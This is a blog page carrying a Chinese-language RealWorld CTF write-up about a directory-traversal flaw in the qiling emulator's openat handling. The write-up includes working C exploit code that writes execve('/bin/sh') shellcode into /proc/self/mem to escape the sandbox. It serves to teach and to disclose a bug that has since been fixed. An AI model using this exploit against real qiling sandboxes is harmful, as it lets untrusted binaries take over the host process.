@@ -1,0 +1,730 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>RealWorld CTF之qiling框架分析 - RainSec</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="RainSec,"> 
+    <meta name="description" content="致力于云原生安全和自动化渗透测试的研究与分享,RealWorld CTF之qiling框架分析qiling​当时题目就给了一个qiling的使用的用例，甚至和官方文档上面的用例差不多因此肯定是库的问题。
+#!/usr/bin/env pytho,"> 
+    <meta name="author" content="RainSec"> 
+    <link rel="alternative" href="atom.xml" title="RainSec" type="application/atom+xml"> 
+    <link rel="icon" href="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220714/logo.jpg"> 
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+
+    
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+
+    
+<link rel="stylesheet" href="/css/obsidian.css">
+
+    
+<link rel="stylesheet" href="/css/ball-atom.min.css">
+
+    
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+
+    
+    <script>var musiclist = ""</script>
+    
+<script src="/js/loadaplayer.js"></script>
+
+    <!-- 引用依赖 -->
+    
+<link rel="stylesheet" href="/aplayer/dist/APlayer.min.css">
+
+    
+<script src="/aplayer/dist/APlayer.min.js"></script>
+<script src="/js/Meting.min.js"></script>
+
+    
+<meta name="generator" content="Hexo 6.0.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">RainSec</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220714/logo.jpg" alt="" data-url="https://rainsec.cn">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">RealWorld CTF之qiling框架分析</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url('https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/realworld.png') ">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="/categories/CTF"><b>「
+                    </b>CTF<b> 」</b></a>
+                
+                January 28, 2022
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/post/Qilin%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90.html" title="RealWorld CTF之qiling框架分析" class="">RealWorld CTF之qiling框架分析</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>Words count</i>
+                    17k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                    15 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>Read count</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <h1 id="RealWorld-CTF之qiling框架分析"><a href="#RealWorld-CTF之qiling框架分析" class="headerlink" title="RealWorld CTF之qiling框架分析"></a>RealWorld CTF之qiling框架分析</h1><h2 id="qiling"><a href="#qiling" class="headerlink" title="qiling"></a>qiling</h2><p>​当时题目就给了一个qiling的使用的用例，甚至和官方文档上面的用例差不多因此肯定是库的问题。</p>
+<pre><code class="python">#!/usr/bin/env python3
+
+import os
+import sys
+import base64
+import tempfile
+# pip install qiling==1.4.1
+from qiling import Qiling
+
+def my_sandbox(path, rootfs):
+    ql = Qiling([path], rootfs)
+    ql.run()
+
+def main():
+    sys.stdout.write('Your Binary(base64):\n')
+    line = sys.stdin.readline()
+    binary = base64.b64decode(line.strip())
+    
+    with tempfile.TemporaryDirectory() as tmp_dir:
+        fp = os.path.join(tmp_dir, 'bin')
+
+        with open(fp, 'wb') as f:
+            f.write(binary)
+
+        my_sandbox(fp, tmp_dir)
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+<p>大致分析qiling源代码发现其加载模拟文件的流程如下（可以看qiling项目core.py文件，其中实现了一个Qiling的类）：</p>
+<ol>
+<li>在实例初始化阶段设置一系列基础信息比如当前平台的操作系统及其架构等。</li>
+<li>设置运行参数</li>
+<li>设置需要的roofs目录，这里也是出问题的一个关键点</li>
+<li>设置操作系统和结构</li>
+<li>设置大小端序和机器长度</li>
+<li>初始化QlCoreStructs结构体，主要是用来pack的</li>
+<li>加载loader，主要就是根据os type导入loader文件夹下的不同文件。</li>
+<li>log日志操作</li>
+<li>加载qiling自己实现的内存管理器和寄存器管理器（这个根据interpreter成员来决定是否加载）</li>
+<li>根据不同arch架构来加载qiling自己的实现的arch，就在目录的arch下</li>
+<li>根据interpreter成员来决定是否初始化QlCoreHooks</li>
+<li>启动之前加载loader，加载目标（linux的话里面其实实现了ELF的解析以及加载到内存的整个过程，甚至如果提供了interpreter也可以进行加载，详情可以看loader文件夹下的elf.py），然后起了一个守护页，看注释应该是保护内存的，至此初始化工作完成。</li>
+<li>根据interpreter成员来决定是否选择不同的执行模式，一般直接初始化osHook通过os运行目标文件</li>
+</ol>
+<p>上面是大致的加载过程，下面分析一下文件是怎么运行起来的（以模拟linux操作系统为例），运行的方式大致是分为运行qiling独立实现的解释器和不使用qiling独立实现的解释器两种，（作者大佬说是区块链智能合约解释器，这块我不是很懂，好像是智能合约bytecode执行，这里主要说os run）</p>
+<p>在QlOsLinux类里面找到相应的run函数：</p>
+<pre><code class="python">    def run(self):
+        if self.ql.exit_point is not None:
+            self.exit_point = self.ql.exit_point
+
+        try:
+            if self.ql.code:
+                self.ql.emu_start(self.entry_point, (self.entry_point + len(self.ql.code)), self.ql.timeout, self.ql.count)
+            else:
+                if self.ql.multithread == True:
+                    # start multithreading
+                    thread_management = thread.QlLinuxThreadManagement(self.ql)
+                    self.ql.os.thread_management = thread_management
+                    thread_management.run()
+
+                else:
+                    if  self.ql.entry_point is not None:
+                        self.ql.loader.elf_entry = self.ql.entry_point
+
+                    elif self.ql.loader.elf_entry != self.ql.loader.entry_point:
+                        entry_address = self.ql.loader.elf_entry
+                        if self.ql.archtype == QL_ARCH.ARM and entry_address &amp; 1 == 1:
+                            entry_address -= 1
+                        self.ql.emu_start(self.ql.loader.entry_point, entry_address, self.ql.timeout)
+                        self.ql.enable_lib_patch()
+                        self.run_function_after_load()
+                        self.ql.loader.skip_exit_check = False
+                        self.ql.write_exit_trap()
+
+                    self.ql.emu_start(self.ql.loader.elf_entry, self.exit_point, self.ql.timeout, self.ql.count)
+</code></pre>
+<p>看了看emu_start，主要是利用unicorn进行模拟执行的。然后看了看linux OS的初始化，总结下来觉得qiling实现的东西还是很多的，比如自己的os loader，arch，syscall，hook等，以x86_64架构下的linux为例子看其是如何加载自己的syscall的。</p>
+<pre><code class="python">        # X8664
+        elif self.ql.archtype == QL_ARCH.X8664:
+            self.gdtm = GDTManager(self.ql)
+            ql_x86_register_cs(self)
+            ql_x86_register_ds_ss_es(self)
+            self.ql.hook_insn(self.hook_syscall, UC_X86_INS_SYSCALL)
+            # Keep test for _cc
+            #self.ql.hook_insn(hook_posix_api, UC_X86_INS_SYSCALL)
+            self.thread_class = thread.QlLinuxX8664Thread     
+            
+def hook_syscall(self, ql, intno = None):
+        return self.load_syscall()
+</code></pre>
+<p>load_syscall本身比较复杂，通过代码可以看出它都实现了那些<a target="_blank" rel="noopener" href="https://github.com/qilingframework/qiling/blob/master/qiling/os/linux/map_syscall.py">syscall</a>，这里的大部门都是直接使用的系统底层的一些syscall，并不是麒麟自己实现的，可以看他的load_syscall函数<a target="_blank" rel="noopener" href="https://github.com/qilingframework/qiling/blob/839e45ed86e56304b93f81a53cf08383d942a494/qiling/os/posix/posix.py#L173">实现</a>，不过在posix文件夹下的syscall文件夹里面发现其实qiling自己也实现了大量的syscall，这俩种syscall在使用时的区别主要在于要模拟的文件源码中是直接使用的syscall还是类似open的这种函数形式，前者会调用qiling自身实现的，后者则会直接调用对应的系统调用（这块基于推理和调试，不过大致qiling的系统调用就是通过hook进行检测然后通过回调调用对应的代码这样子），调用回溯如下：</p>
+<p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/qilin1.png" alt="image-20220125165540628"></p>
+<p>其实从上面就可以看出，qiling本身实现的功能还是很多的，比如内存管理，动态模拟不同架构等，但是根据从大佬哪里偷来的经验，首先像python这种高级语言，内存出现问题是很不常见的，大多都是逻辑问题，那么就很可能是实现跟底层系统进行交互的设计出现问题，比如实现的syscall，这也是rwctf的考点。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>​以qiling实现的<a target="_blank" rel="noopener" href="https://github.com/qilingframework/qiling/blob/94bf7a3bc4e3ea0cffaaa52dbc477c11030f631b/qiling/os/posix/syscall/fcntl.py#L15">ql_syscall_open</a>为例子：</p>
+<pre><code class="python">def ql_syscall_open(ql: Qiling, filename: int, flags: int, mode: int):
+    path = ql.os.utils.read_cstring(filename)
+    real_path = ql.os.path.transform_to_real_path(path)
+    relative_path = ql.os.path.transform_to_relative_path(path)
+    flags &amp;= 0xffffffff
+    mode &amp;= 0xffffffff
+
+    idx = next((i for i in range(NR_OPEN) if ql.os.fd[i] == 0), -1)
+    if idx == -1:
+        regreturn = -EMFILE
+    else:
+        try:
+            if ql.archtype== QL_ARCH.ARM and ql.ostype!= QL_OS.QNX:
+                mode = 0
+            #flags = ql_open_flag_mapping(ql, flags)
+            flags = ql_open_flag_mapping(ql, flags)
+            ql.os.fd[idx] = ql.os.fs_mapper.open_ql_file(path, flags, mode)
+            regreturn = idx
+        except QlSyscallError as e:
+            regreturn = - e.errno
+    ql.log.debug("open(%s, 0o%o) = %d" % (relative_path, mode, regreturn))
+
+    if regreturn &gt;= 0 and regreturn != 2:
+        ql.log.debug(f'File found: {real_path:s}')
+    else:
+        ql.log.debug(f'File not found {real_path:s}')
+
+    return regreturn
+</code></pre>
+<p>首先通过绝对路径获取模拟执行文件在rootfs下的相对路径，然后将flags传递给ql_open_flag_mapping，然后进行open操作，将得到的fd通过idx索引进行一个存储。</p>
+<p>其大致的函数调用链如下：</p>
+<blockquote>
+<p>ql_syscall_open –&gt;  open_ql_file —&gt; os.open</p>
+</blockquote>
+<pre><code class="python">    def open_ql_file(self, path, openflags, openmode, dir_fd=None):
+        if self.has_mapping(path):
+            self.ql.log.info(f"mapping {path}")
+            return self._open_mapping_ql_file(path, openflags, openmode)
+        else:
+            if dir_fd:
+                return ql_file.open(path, openflags, openmode, dir_fd=dir_fd)
+
+            real_path = self.ql.os.path.transform_to_real_path(path)
+            return ql_file.open(real_path, openflags, openmode)
+</code></pre>
+<p>在open_ql_file这里发现可能存在漏洞，函数首先判断文件是否已经打开过了，然后判断是否存在dir_fd，如果不存在的话会调用transform_to_real_path函数，该函数也是实现模拟器文件系统隔离的一个关键，这里面对符号链接文件进行了多重解析，但是好像没对路径进行判断，应该也会出现链接的目标问题，它返回一个文件在系统上面的真实路径，然后由open打开相关文件。</p>
+<pre><code class="python">    def transform_to_real_path(self, path: str) -&gt; str:
+        real_path = self.convert_path(self.ql.rootfs, self.cwd, path)
+
+.......
+
+        return str(real_path.absolute())
+</code></pre>
+<p>但是真正的隔离其实是convert_path实现的：</p>
+<pre><code class="python">    @staticmethod
+    def convert_for_native_os(rootfs: Union[str, Path], cwd: str, path: str) -&gt; Path:
+        _rootfs = Path(rootfs)
+        _cwd = PurePosixPath(cwd[1:])
+        _path = Path(path)
+
+        if _path.is_absolute():
+            return _rootfs / QlPathManager.normalize(_path)
+        else:
+            return _rootfs / QlPathManager.normalize(_cwd / _path.as_posix())
+
+    def convert_path(self, rootfs: Union[str, Path], cwd: str, path: str) -&gt; Path:
+        emulated_os = self.ql.ostype
+        hosting_os = self.ql.platform_os
+
+        # emulated os and hosting platform are of the same type
+        if  (emulated_os == hosting_os) or (emulated_os in QL_OS_POSIX and hosting_os in QL_OS_POSIX):
+            return QlPathManager.convert_for_native_os(rootfs, cwd, path)
+
+        elif emulated_os in QL_OS_POSIX and hosting_os == QL_OS.WINDOWS:
+            return QlPathManager.convert_posix_to_win32(rootfs, cwd, path)
+
+        elif emulated_os == QL_OS.WINDOWS and hosting_os in QL_OS_POSIX:
+            return QlPathManager.convert_win32_to_posix(rootfs, cwd, path)
+
+        else:
+            return QlPathManager.convert_for_native_os(rootfs, cwd, path)
+</code></pre>
+<p>这里建立了rootfs，第一步肯定是想到的路径穿越，比如../../../../这种，但是实验发现../../../test也会被拼接成rootfs/test，原因在于convert_for_native_os函数中利用了normalize进行了处理，导致无法进行路径穿越：</p>
+<p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/qilin2.png" alt="image-20220125190221473"></p>
+<pre><code class="python">    def normalize(path: Union[Path, PurePath]) -&gt; Union[Path, PurePath]:
+        # expected types: PosixPath, PurePosixPath, WindowsPath, PureWindowsPath
+        assert isinstance(path, (Path, PurePath)), f'did not expect {type(path).__name__!r} here'
+
+        normalized_path = type(path)()
+
+        # remove anchor (necessary for Windows UNC paths) and convert to relative path
+        if path.is_absolute():
+            path = path.relative_to(path.anchor)
+
+        for p in path.parts:
+            if p == '.':
+                continue
+
+            if p == '..':
+                normalized_path = normalized_path.parent
+                continue
+
+            normalized_path /= p
+
+        return normalized_path
+</code></pre>
+<p>符号链接就可以绕过检查，但是遗憾的是qiling没有实现symlink的系统调用，不过，回看open_ql_file的代码可以看出，如果dir_fd存在，那么就可以绕过这些检查，这时候自然就可以想到ql_syscall_openat的实现，这个就很简单，里面也没什么严格的检查，因此就可以实现目录穿越。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>​        在实现了目录穿越之后其实问题就变得简单了，我们可以通过/proc/self/maps获取到自身进程的内存信息，然后通过/proc/self/mem实现恶意代码执行，进而完成逃逸，这里展示一个小demo。</p>
+<pre><code class="c">#include&lt;stdio.h&gt;
+#include&lt;fcntl.h&gt;
+#include&lt;string.h&gt;
+unsigned char nop[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
+unsigned char code[] = "\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x1\x1\x81\x34\x24\x1\x1\x1\x1\x31\xf6\x56\x6a\x8\x5e\x48\x1\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\xf\x5";
+int main() {
+    char buf[4096] = "0";
+    int fd = open("/proc/self/maps", O_RDONLY);
+    int fd_mem = open("/proc/self/mem", O_RDWR);
+    FILE *fp_map = fdopen(fd, "r");
+    unsigned long addr = 0;
+    while(1) {
+        fgets(buf, sizeof buf, fp_map);
+        if (strstr(buf, "r-xp")!=NULL &amp;&amp; strstr(buf, "libc-")) {
+            sscanf(buf, "%lx-", &amp;addr);
+            break;
+        }
+    }
+    lseek(fd_mem, addr, SEEK_SET);
+    for (int i=0; i&lt;150; i++) {
+        write(fd_mem, nop, sizeof nop - 1);
+    }
+    write(fd_mem, code, sizeof code);
+    return 0;
+}
+</code></pre>
+<p>不过大家可能会好奇，mem的权限为啥允许写入shellcode：</p>
+<p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/qilin3.png" alt="image-20220127104107416"></p>
+<p>答案可以参考这篇文章：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/257350#h2-0">https://www.anquanke.com/post/id/257350#h2-0</a></p>
+</blockquote>
+<p>至此，我们其实就拥有了整个攻击链，先进行目录穿越找到/proc/self/mem，然后写入shellcode。</p>
+<pre><code class="c">int main() {
+    long start_addr;
+
+    // Open mappings
+    int map = openat(1, "/proc/self/maps", O_RDONLY);
+
+    // Open Python process memory
+    int mem = openat(1, "/proc/self/mem", O_RDWR);
+    FILE *fp_map = fdopen(map, "r");
+
+    // Find the first executable mapping for Libc
+    char line[4096];
+    while (fgets(line, sizeof line, fp_map)) {
+        size_t len = strlen(line);
+        if (strstr(line, "r-xp") != NULL &amp;&amp; strstr(line, "libc-")) {
+            // Retrive start address of mapping
+            sscanf(line, "%lx-", &amp;start_addr);
+            printf("%lx\n", start_addr);
+            break;
+        }
+    }
+
+    // Seek to the address of the executable mapping for Libc
+    lseek(mem, start_addr, SEEK_SET);
+    for(int i=0; i &lt; 3; i++) {
+        write(mem, nop, sizeof nop -1);
+    }
+    // Write the payload into the executable mapping
+    write(mem, code, sizeof code);
+    return 0;
+}
+</code></pre>
+<p>shellcode就不贴了，占地方，可以参考上面那个demo里面的。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​这个题目本身算是一个容器逃逸的题目，qiling在实现自己的rootfs的时候对系统调用的检测不严格是问题的根源。官方也及时进行了修复：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/qilingframework/qiling/pull/1076/commits/6d0fc4a81880abc2984552ccd23497d8832d00fe">https://github.com/qilingframework/qiling/pull/1076/commits/6d0fc4a81880abc2984552ccd23497d8832d00fe</a></p>
+</blockquote>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/statics/chengdu.mp3'></li>
+                
+                    
+            </ul>
+            
+                        
+            
+            
+    <div id='gitalk-container' class="comment link"
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d=''
+        data-p='https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token'
+    >Comments</div>
+
+
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/clocklogo.jpg" height=300 width=300></img>
+                    <p>Clock</p>
+                    <span>克劳克歪歪滴艾斯</span>
+                    <dl>
+                        
+                        
+                            
+                                <dd>
+                                    <link rel="stylesheet" type="text/css" href="">
+                                    <a href="function link() { [native code] }" target="_blank"><span
+                                    class=" iconfont "></span></a>
+                                </dd>
+                            
+                            
+                            
+                        
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">6 <p>Articles</p></a></li>
+                    <li><a href="/categories">10 <p>Categories</p></a></li>
+                    <li><a href="/tags">6 <p>Tags</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            <div class="box sticky animated fadeInRight faster">
+                <div id="toc" class="subbox">
+                    <h4>Contents</h4>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RealWorld-CTF%E4%B9%8Bqiling%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">RealWorld CTF之qiling框架分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#qiling"><span class="toc-number">1.1.</span> <span class="toc-text">qiling</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.1.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.3.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2022
+        <span class="gradient-text">
+            RainSec
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.9.3" target="_blank" rel="noopener">v1.4.9.3</a></small>
+        
+        
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
